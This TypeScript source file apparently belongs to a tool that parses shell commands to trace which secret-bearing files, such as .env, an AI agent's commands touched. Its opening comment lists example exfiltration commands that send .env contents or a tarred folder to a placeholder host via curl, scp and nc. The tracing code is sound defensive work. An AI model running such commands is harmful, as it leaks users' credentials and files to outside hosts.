// The files a shell command names, read from its words, so that what a command did with a key
// file (a file keys were read from) can be found: `curl --data-binary @.env`, `scp ./.env host:`,
// `bash up.sh .env`, `tar czf - dir | nc host`. A file the AI wrote a key into is followed by
// coarser rules, by its name alone (`analyze.ts`). A word names a path as it is, or after its last
// `@` or its first `=` (`-d @file`, `--upload-file=file`). A relative path is read against the
// folder the session ran in and every folder it changed to (`cd`), and also as the end of a path
// (`leak.txt`, `work/leak.txt`, `~/../tmp/work/leak.txt` all name `/tmp/work/leak.txt`), since a
// folder changed to in a way Stroq cannot read would be missed otherwise.
//
// A pattern names every file it may match, read one folder at a time: the text before its first
// wildcard must start the name and the text after its last must end it. How sure that is depends on
// who fills it in, read from the core's own reading of the command's words and quotes:
//
//   - a wildcard the shell fills in (unquoted), that needs no dotglob to reach the file: sure;
//   - a `*` or `?` that would reach a file whose name starts with a dot only with dotglob,
//     `GLOB_DOTS` or `GLOBIGNORE`; a quoted wildcard handed to a program that fills in its own
//     arguments (`curl -T` with `{}` or `[]`, `find -name`, `tar --wildcards`, an rsync filter,
//     a git pathspec); any wildcard in a command whose quotes do not balance: maybe;
//   - a quoted wildcard handed to a program that fills in nothing (a JSON body to `curl -d`), or a
//     word that is only braces or brackets: no file at all.
//
// The words are also cut at blanks, quotes and the shell's operators by one class, for the paths
// a quoted script names (`python3 -c "open('.env')"`): those are read as the paths they spell,
// never as patterns. Nothing backtracks.
import { basename, isAbsolute, join, normalize, sep } from 'node:path';
import { lex, REDIRECT, resolve, splitCommand, type Resolved, type Word } from '@stroq/core';
import { readBudgetLeft } from './shell-read.js';

/** The words of a text a file could be named by: cut at blanks, quotes and the shell's operators. */
export const pathWords = (text: string): string[] =>
  text.split(/[\s;&|()<>'"`]+/).filter((w) => w !== '');

/** A word a command may name a file by, and how its wildcards are read. */
export interface PathWord {
  readonly text: string;
  /** Its wildcards are filled in, by the shell or by the program: it names what it may match. */
  readonly pattern: boolean;
  /** Who fills them in is sure (the shell); else a program, or quotes that do not balance. */
  readonly sure: boolean;
}

/** Where a command may run: the session's folder and the folders it changed to. */
export interface Folders {
  readonly cwd: string | null;
  readonly more?: readonly string[];
}

/**
 * A path with its `.` and `..` parts read, as `normalize` reads it, in time linear in its length:
 * `normalize` is quadratic in the `..` that lead a relative path, and the path is the agent's.
 */
export function normalPath(path: string): string {
  if (isAbsolute(path)) return normalize(path);
  const parts: string[] = [];
  for (const part of path.split(sep)) {
    if (part === '' || part === '.') continue;
    if (part === '..' && parts.length > 0 && parts[parts.length - 1] !== '..') parts.pop();
    else parts.push(part);
  }
  const joined = parts.join(sep);
  return joined === '' ? '.' : joined;
}

/** Characters that make a word a pattern the shell or curl fills in. */
const WILD = /[*?[{]/;
/** Characters the shell fills in on its own: a brace with no comma is plain text to it. */
const SHELL_WILD = /[*?[]/;

/** A pattern that is more than braces and brackets: `{`, `}` and `[]` alone name no file. */
const pathLike = (word: string): boolean => word.replace(/[{}[\],]/g, '') !== '';

const trimSep = (path: string): string =>
  path.length > 1 && path.endsWith(sep) ? path.slice(0, -1) : path;

/** Options of `find` whose value it matches file names against. */
const FIND_NAMES: ReadonlySet<string> = new Set([
  '-name',
  '-iname',
  '-path',
  '-ipath',
  '-wholename',
  '-iwholename',
]);
const RSYNC_FILTERS: ReadonlySet<string> = new Set(['--include', '--exclude', '--filter', '-f']);

/** Whether a program fills in the wildcards of an argument it is handed in quotes. */
function programGlobs(found: Resolved, at: number, value: string, tarWildcards: boolean): boolean {
  const before = found.args[at - 1]?.value ?? '';
  switch (found.name) {
    case 'curl':
      // curl fills in `{a,b}` and `[1-9]` in what it uploads, not `*`.
      return (
        (before === '-T' || before === '--upload-file' || /^(?:-T|--upload-file=)/.test(value)) &&
        /[{[]/.test(value)
      );
    case 'find':
      return FIND_NAMES.has(before);
    case 'tar':
    case 'gtar':
    case 'bsdtar':
      return tarWildcards;
    case 'rsync':
      return RSYNC_FILTERS.has(before) || /^--(?:include|exclude|filter)=/.test(value);
    case 'git':
      return true;
    default:
      return false;
  }
}

/** The words a word of a stage may name a file by: a redirect's file without its operator. */
function valueOf(word: Word): string {
  if (!word.redirect) return word.value;
  const operator = REDIRECT.exec(word.value);
  return operator === null ? word.value : word.value.slice(operator[0].length);
}

/** Whether a word written with quotes still has a wildcard outside them: `/w/"x"*.env`. */
const globOutsideQuotes = (raw: string | undefined): boolean => {
  if (raw === undefined) return false;
  let quote = '';
  for (let i = 0; i < raw.length; i += 1) {
    const c = raw[i] as string;
    if (quote !== '') {
      if (c === quote) quote = '';
    } else if (c === '\\') i += 1;
    else if (c === "'" || c === '"') quote = c;
    else if (SHELL_WILD.test(c)) return true;
  }
  return false;
};

/** Whether a stage's own quotes do not balance, as the core's lexer reads the stage alone. */
function unbalancedStage(text: string): boolean {
  try {
    return lex(text).uncertain;
  } catch {
    return true;
  }
}

/**
 * The words of one stage, as the core resolves it, with how sure each wildcard is. A wildcard
 * outside quotes, by the word's own text, is the shell's: sure, unless this stage's quotes do not
 * balance. One inside quotes is a maybe only when the program fills it in itself.
 */
function stageWords(text: string): PathWord[] {
  let found: Resolved | null = null;
  try {
    found = resolve(text);
  } catch {
    found = null;
  }
  if (found === null) return plainWords(text, true);
  const unbalanced = unbalancedStage(text);
  const tarWildcards = found.args.some((w) => w.value === '--wildcards');
  const out: PathWord[] = [];
  for (const [at, word] of found.args.entries()) {
    const value = valueOf(word);
    if (value === '') continue;
    const shellGlob =
      word.raw === undefined ? !word.quoted && SHELL_WILD.test(value) : globOutsideQuotes(word.raw);
    if (!WILD.test(value) || !pathLike(value))
      out.push({ text: value, pattern: false, sure: true });
    else if (shellGlob) out.push({ text: value, pattern: true, sure: !unbalanced });
    else if (unbalanced || (word.quoted && programGlobs(found, at, value, tarWildcards)))
      out.push({ text: value, pattern: true, sure: false });
    else out.push({ text: value, pattern: false, sure: true });
  }
  return out;
}

/**
 * The words of a text cut by one class, as the paths they spell. `uncertain`: a wildcard in one may
 * be filled in, nobody can say by whom (a word only this cut sees, a text too long to read).
 */
function plainWords(text: string, uncertain: boolean): PathWord[] {
  return pathWords(text).map((w) =>
    uncertain && WILD.test(w) && pathLike(w)
      ? { text: w, pattern: true, sure: false }
      : { text: w, pattern: false, sure: true },
  );
}

/** A command longer than this is read only as plain words: any wildcard in it is a maybe. */
const MAX_WORDS_CHARS = 64 * 1024;

let lastWords: { readonly text: string; readonly words: PathWord[] } | null = null;

/**
 * Every word a command may name a file by: those of each stage of the command and of every text
 * it nests (a `bash -c` body, a substitution), as the core reads them, with how sure each wildcard
 * is; and the command cut by one class, as the paths its quoted text spells.
 */
export function commandPathWords(text: string): PathWord[] {
  if (lastWords !== null && lastWords.text === text) return lastWords.words;
  let words: PathWord[];
  // Too long, or past the run's time for reading commands: the plain cut, every wildcard a maybe.
  if (text.length > MAX_WORDS_CHARS || !readBudgetLeft()) words = plainWords(text, true);
  else {
    try {
      const nested = splitCommand(text).texts.slice(1);
      words = [];
      for (const each of [text, ...nested])
        for (const stage of lex(each).pipelines.flat()) words.push(...stageWords(stage.text));
      // What only the plain cut sees (a path a quoted script spells) is read as that path, and a
      // wildcard in it as a pattern someone may fill in: never as a plain name.
      const seen = new Set(words.map((w) => w.text));
      words.push(...plainWords(text, true).filter((w) => !seen.has(w.text)));
    } catch {
      words = plainWords(text, true);
    }
  }
  lastWords = { text, words };
  return words;
}

/**
 * The texts a word may name a path by: the word, and what follows its last `@` or its first `=`
 * (`-d @file`, `-F x=@file`, `--upload-file=file`, `if=file`). A URL, or a file on another host
 * (`host:/path`), names none here.
 */
function candidatesOf(word: string): string[] {
  const found = new Set([
    word,
    word.slice(word.lastIndexOf('@') + 1),
    word.slice(word.indexOf('=') + 1),
  ]);
  return [...found].filter(
    (c) => c !== '' && !c.includes('://') && (isAbsolute(c) || !c.includes(':')),
  );
}

/** The folders a relative path is read against. */
const basesOf = (folders: Folders): string[] =>
  [folders.cwd, ...(folders.more ?? [])].filter((f): f is string => f !== null);

/**
 * The last part of every path a command's words may name, and whether a word is a pattern or a
 * folder named by `.`: for finding the commands that may name a file by another path. A wildcard
 * nobody fills in is no pattern.
 */
export function namedEnds(command: string): { readonly ends: Set<string>; readonly wild: boolean } {
  const ends = new Set<string>();
  // Past the run's time for reading commands, a command may name any file.
  let wild = !readBudgetLeft();
  for (const word of commandPathWords(command))
    for (const c of candidatesOf(word.text)) {
      if ((word.pattern && WILD.test(c) && pathLike(c)) || /^\.{1,2}\/?$/.test(c)) wild = true;
      ends.add(basename(trimSep(c)));
    }
  return { ends, wild };
}

/** How a path names a file, and whether that is sure. */
export interface Naming {
  readonly kind: 'file' | 'folder';
  readonly sure: boolean;
}

/**
 * Whether a part of a pattern matches a part of a path: its text before and after the wildcards.
 * `dot`: it matches a name that starts with a dot, which a glob reaches only with dotglob; a brace
 * reaches it.
 */
function partMatches(pattern: string, part: string): 'yes' | 'dot' | 'no' {
  const first = pattern.search(WILD);
  if (first < 0) return pattern === part ? 'yes' : 'no';
  let last = first;
  for (let i = first; i < pattern.length; i += 1) if (WILD.test(pattern[i] ?? '')) last = i;
  const head = pattern.slice(0, first);
  // What follows the last wildcard; a closing `]` or `}` belongs to it.
  const tail = pattern.slice(last + 1).replace(/^[^/]*?[\]}]/, '');
  const fits =
    part.length >= head.length + tail.length && part.startsWith(head) && part.endsWith(tail);
  if (!fits) return 'no';
  return part.startsWith('.') && !pattern.startsWith('.') && !pattern.includes('{') ? 'dot' : 'yes';
}

/** How an absolute pattern names a file, one folder at a time. */
function patternNames(pattern: string, file: string): Naming | null {
  const want = trimSep(pattern).split(sep);
  const have = file.split(sep);
  if (want.length > have.length) return null;
  let sure = true;
  for (let i = 0; i < want.length; i += 1) {
    const part = want[i] as string;
    if (part === '**') return { kind: 'file', sure };
    const match = partMatches(part, have[i] as string);
    if (match === 'no') return null;
    if (match === 'dot') sure = false;
  }
  return { kind: want.length === have.length ? 'file' : 'folder', sure };
}

/** How one absolute path names a file, read as a pattern or as the path it spells. */
function absoluteNames(path: string, file: string, pattern: boolean): Naming | null {
  if (pattern && WILD.test(path)) return patternNames(normalize(path), file);
  const clean = trimSep(normalize(path));
  if (clean === file) return { kind: 'file', sure: true };
  return file.startsWith(clean.endsWith(sep) ? clean : `${clean}${sep}`)
    ? { kind: 'folder', sure: true }
    : null;
}

/** A relative path with what leads it (`./`, `../`, `~/`) dropped. */
const endOf = (path: string): string =>
  normalPath(path)
    .split(sep)
    .filter((part) => part !== '' && part !== '.' && part !== '..' && part !== '~')
    .join(sep);

/**
 * How a relative path names a file as the end of its path: `leak.txt` and `work/leak.txt` name
 * `/tmp/work/leak.txt`, `work` a folder it is in.
 */
function endNames(path: string, file: string): Naming | null {
  const rest = endOf(path);
  if (rest === '') return null;
  if (file === `${sep}${rest}` || file.endsWith(`${sep}${rest}`))
    return { kind: 'file', sure: true };
  return file.includes(`${sep}${rest}${sep}`) ? { kind: 'folder', sure: true } : null;
}

/** The better of two namings: a file over a folder, a sure one over a maybe. */
const better = (a: Naming | null, b: Naming | null): Naming | null => {
  if (a === null) return b;
  if (b === null) return a;
  const rank = (n: Naming): number => (n.kind === 'file' ? 0 : 2) + (n.sure ? 0 : 1);
  return rank(b) < rank(a) ? b : a;
};

/** How a word of a command names a file: the file itself, a folder it is in, or neither. */
export function namesFileHow(
  word: PathWord,
  file: string,
  folders: Folders | string | null,
): Naming | null {
  const where: Folders =
    typeof folders === 'object' && folders !== null ? folders : { cwd: folders };
  let found: Naming | null = null;
  for (const c of candidatesOf(word.text)) {
    const pattern = word.pattern && WILD.test(c);
    // Braces or brackets alone are no path, whatever makes something of them.
    if (pattern && !pathLike(c)) continue;
    const take = (n: Naming | null): Naming | null =>
      n === null ? null : { kind: n.kind, sure: n.sure && word.sure };
    if (isAbsolute(c)) found = better(found, take(absoluteNames(c, file, pattern)));
    else {
      if (c.startsWith('~')) {
        if (c === file) found = better(found, take({ kind: 'file', sure: true }));
      } else if (pattern || endOf(c) === '')
        // A pattern, or a word that is only `.` and `..`: read against each folder.
        for (const base of basesOf(where))
          found = better(found, take(absoluteNames(join(base, c), file, pattern)));
      // Any other relative path is read as the end of a path below, whatever folder it is under.
      if (!pattern) found = better(found, take(endNames(c, file)));
    }
    if (found?.kind === 'file' && found.sure) return found;
  }
  return found;
}

/**
 * How a word names a file, for a word read with no quotes around it: a wildcard in it is a pattern.
 * Only a sure naming counts.
 */
export function namesFile(
  word: string,
  file: string,
  folders: Folders | string | null,
): 'file' | 'folder' | null {
  const named = namesFileHow(
    { text: word, pattern: WILD.test(word) && pathLike(word), sure: true },
    file,
    folders,
  );
  return named !== null && named.sure ? named.kind : null;
}

/** Folders changed to, at most, in one command. */
const MAX_CHANGED = 16;

/** The folders a command changes to, and what of it could not be read. */
export interface FolderChanges {
  readonly folders: string[];
  /** A change to a folder named by a variable, from the home folder, or `cd -`, `popd`, `cd`. */
  readonly unread: boolean;
  /** More changes than are read: the rest were not followed. */
  readonly cut: boolean;
}

/**
 * The folders a command changes to (`cd dir`, `pushd dir`, where a command starts), read against
 * `from` and each other in turn: a relative one is joined to the folder before it. A folder named
 * by a variable or from the home folder is not read, and says so.
 */
export function folderChanges(command: string, from: string | null): FolderChanges {
  const folders: string[] = [];
  let now = from;
  let unread = false;
  for (const part of command.replace(/['"\\]/g, '').split(/[;&|()\n]+/)) {
    const words = part.trim().split(/\s+/);
    if (words[0] === 'popd') unread = true;
    if (words[0] !== 'cd' && words[0] !== 'pushd') continue;
    const target = words.slice(1).find((w) => !w.startsWith('-'));
    if (target === undefined || target.startsWith('~') || /[$`]/.test(target)) {
      unread = true;
      continue;
    }
    if (!isAbsolute(target) && now === null) {
      unread = true;
      continue;
    }
    if (folders.length >= MAX_CHANGED) return { folders, unread, cut: true };
    now = trimSep(normalPath(isAbsolute(target) ? target : join(now as string, target)));
    folders.push(now);
  }
  return { folders, unread, cut: false };
}

/** The folders a command changes to; see `folderChanges`. */
export const changedFolders = (command: string, from: string | null): string[] =>
  folderChanges(command, from).folders;
